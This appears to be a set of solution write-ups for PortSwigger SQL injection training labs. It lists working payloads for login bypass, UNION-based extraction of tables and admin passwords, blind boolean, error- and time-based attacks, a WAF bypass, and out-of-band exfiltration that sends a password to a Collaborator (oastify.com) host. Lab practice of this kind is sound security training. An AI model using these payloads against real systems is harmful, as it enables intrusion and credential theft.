---
description: >-
  The page linked below shows a simple setup to start learning SQL and testing
  SQL injection payloads locally. One of the biggest things you can do to
  catapult your learning and experience is to set thi
---

# SQLi lab setup & writeups

### Labs list

**SQL injection vulnerability in WHERE clause allowing retrieval of hidden data**

PortSwigger | free | easy | [link to lab](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

<details>

<summary>Solution</summary>

```
1. Click on a search item such as gifts

2. Modify the query to include your payload

/filter?category=Gifts' or 1='1

3. Send the request
```

</details>

**SQL injection vulnerability allowing login bypass**

PortSwigger | free | easy | [link to lab](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

<details>

<summary>Solution</summary>

```
1. Browse to the login page

2. Enter your payload into the username box

administrator' or 1=1-- -

3. Enter any password

4. Click Log in
```

</details>

**SQL injection attack, querying the database type and version on Oracle**

PortSwigger | free | easy | [link to lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

<details>

<summary>Solution</summary>

```
1. Select one of the filters to refine the search

2. Test for UNION attack

' UNION SELECT null FROM dual--
' UNION SELECT null,null FROM dual--

3. Select the database version

' UNION SELECT banner,null FROM v$version--
```

</details>

**SQL injection attack, querying the database type and version on MySQL and Microsoft**

PortSwigger | free | easy | [link to lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)

<details>

<summary>Solution</summary>

```
1. Select one of the filters to refine the search

2. Test for UNION attack

' UNION SELECT null-- -
' UNION SELECT null,null-- -

3. Select the database version

' UNION SELECT version(),null-- -
```

</details>

**SQL injection attack, listing the database contents on non-Oracle databases**

PortSwigger | free | easy | [link to lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)

<details>

<summary>Solution</summary>

```
1. Select one of the filters to refine the search

2. Test for UNION attack

' UNION SELECT null-- -
' UNION SELECT null,null-- -

3. List the tables in the DB

' UNION SELECT table_name,null FROM information_schema.tables--

Table name is users_[unique-value]

4. List the column names in the table

' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name = 'users_[unique-value]'--

5. Get the password for the user 'administrator' and then login

' UNION SELECT password_[unique-value],null FROM users_[unique-value] WHERE username_[unique-value]='administrator'--
```

</details>

**SQL injection attack, listing the database contents on Oracle**

PortSwigger | free | easy | [link to lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

<details>

<summary>Solution</summary>

```
1. Select one of the filters to refine the search

2. Test for UNION attack

' UNION SELECT null FROM dual--
' UNION SELECT null,null FROM dual--

3. List the tables in the DB

' UNION SELECT null,table_name FROM all_tables--

USERS_[unique-value]

4. Get the column names

' UNION SELECT null,column_name FROM all_tab_columns WHERE table_name=USERS_[unique-value]--

5. Get the user information and then login

' UNION SELECT USERNAME_CPHKFO,PASSWORD_BQUKUN FROM USERS_TAGNSD--

```

</details>

**SQL injection UNION attack, determining the number of columns returned by the query**

PortSwigger | free | easy | [link to lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

<details>

<summary>Solution</summary>

```
1. Keep adding null until you find the solution

' UNION SELECT null-- -
' UNION SELECT null,null-- -
' UNION SELECT null,null,null-- -
etc
```

</details>

**SQL injection UNION attack, finding a column containing text**

PortSwigger | free | easy | [link to lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

<details>

<summary>Solution</summary>

```
1. Find the number of columns

' UNION SELECT null,null,null--

2. Test each column for text

' UNION SELECT 'a',null,null--
' UNION SELECT null,'a',null--
' UNION SELECT null,null,'a'--

3. Substitute in the given text (or test with it initially)

```

</details>

**SQL injection UNION attack, retrieving data from other tables**

PortSwigger | free | easy | [link to lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

<details>

<summary>Solution</summary>

```
1. Figure out the number of columns and then the version

' UNION SELECT null--
' UNION SELECT null,null--
' UNION SELECT version(),null--

3. Get the table names

' UNION SELECT table_name,null FROM information_schema.tables--
users

4. Looks like to unique values so we can just grab the username and password and then login

' UNION SELECT username,password FROM users--

5. Login as the administrator
```

</details>

**SQL injection UNION attack, retrieving multiple values in a single column**

PortSwigger | free | easy | [link to lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

<details>

<summary>Solution</summary>

```
1. Figure out the number of columns and which can return strings

' UNION SELECT null--
' UNION SELECT null,null--
' UNION SELECT 'a',null--
' UNION SELECT null,'a'--

2. Check the version of the DB and use CONCAT to grab the username and password

' UNION SELECT null,version()--
' UNION SELECT null,username||password FROM users-- 

3. Login with the administrator credentials to solve the lab

```

</details>

**Blind SQL injection with conditional responses**

PortSwigger | free | medium | [link to lab](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

<details>

<summary>Solution</summary>

<pre><code>1. Find the injectable point with the following payload and watching the Content-Length response header change

' AND 1=1--
' AND 1=2--

2. Get a working payload for SUBSTRING

' AND SUBSTRING('abc',1,1)='a'--

3. Setup the payload to grab the administrators password

' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)&#x3C;'m'--

4. Setup intruder and mark the first '1' and the character to fuzz, set the attack type to cluster bomb

' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),§1§,1)='§m§'--

5. Add the payloads a-z A-Z 0-9 for the first list, and 1-30 for the second

6. Start attack, when finished, filter by 'Welcome'

<strong>7. Login with 'administrator' and the password
</strong></code></pre>

</details>

**Blind SQL injection with conditional errors**

PortSwigger | free | medium | [link to lab](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)

<details>

<summary>Solution</summary>

```
1. Find the injectable point with the following payload to create an error

' UNION SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--
' UNION SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--

2. Verify you can use SUBSTR to select the first character

' UNION SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)<'m') THEN TO_CHAR(1/0) ELSE NULL END FROM dual--
Test with > and < and = to double check you can get 200 OK

3. Add the position markers and set the attack type to cluster bomb

' UNION SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),§1§,1)='§m§') THEN TO_CHAR(1/0) ELSE NULL END FROM dual--

4. Set the first list to 1-30. the second list to a-z 0-9 and run the attack

5. Filter out the 200 resuls and get the password

6. Login with 'administrator' and the password


```

</details>

**Visible error-based SQL injection**

PortSwigger | free | medium | [link to lab](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)

<details>

<summary>Solution</summary>

```
1. Find the injectable point with a single quote to trigger an error

2. Use the following payload to trigger a meaningful error and identify it as MSSQL

' AND SELECT CAST((SELECT password FROM users LIMIT 1) AS int)--

3. We need to use a boolean expression

' AND CAST((SELECT 1) AS int)-- -
' AND CAST((SELECT 1) AS int)=1-- -

4. Select password from users

' AND CAST((SELECT password FROM users) AS int)=1-- -

5. Limit 1 (follow the error message)

' AND CAST((SELECT password FROM users LIMIT 1) AS int)=1-- -

6. Login to solve the lab
```

</details>

**Blind SQL injection with time delays**

PortSwigger | free | medium | [link to lab](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)

<details>

<summary>Solution</summary>

```
1. Find the injection point by trying different payloads along with AND, UNION and stacked queries ;

;SELECT pg_sleep(10)-- -

*Remember to encode the ; otherwise your payload may be interpreted as another cookie
```

</details>

**Blind SQL injection with time delays and information retrieval**

PortSwigger | free | medium | [link to lab](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)

<details>

<summary>Solution</summary>

```
1. Find the injection point with the sleep payload

'; SELECT pg_sleep(10)--
*Remember to encode the ;

2. Verify a conditional time delay and create a payload

'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END
'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,§1§,1)='§a§') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--

3. Setup intruder as with the previous labs, select Columns and 'Response Received'

List be the Response received column and the ones we want should be > 10,000

4. Login to solve the lab
```

</details>

**Blind SQL injection with out-of-band interaction**

PortSwigger | free | medium | [link to lab](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)

<details>

<summary>Solution</summary>

```
1. Find the injection point by fuzzing variations of the OOB payloads

SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')--
exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'--
copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a') SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'-- -

' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--

*Make sure to encode the payload otherwise you get 500 error

2. Go to 'Collaborator' and click poll now to see the results
```

</details>

**Blind SQL injection with out-of-band data exfiltration**

PortSwigger | free | medium | [link to lab](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)

<details>

<summary>Solution</summary>

```
1. Find the injection point by fuzzing variations of the OOB payloads

' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
*Don't forget to encode the payload

2. Add a concatenated SELECT statement to the payload

'||(SELECT+password+FROM+users+WHERE+username='administrator')||'

' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.3z36x61ewxqp75s04gzau6c1tszjnady2.oastify.com/"> %remote;]>'),'/l') FROM dual--

3. Clock poll now on collaborator after sending the request and login with the password that's passed as the subdomain

*The full address is shown at the bottom of the page in the description section
```

</details>

**SQL injection with filter bypass via XML encoding**

PortSwigger | free | medium | [link to lab](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)

<details>

<summary>Solution</summary>

```
1. Find the injection point by passing in payloads such as

1+1
'
etc

2. Use Hackvertor to add a WAF bypass

<@dec_entities>1 UNION SELECT password FROM users<@/dec_entities>

3. Login to solve the lab
```

</details>
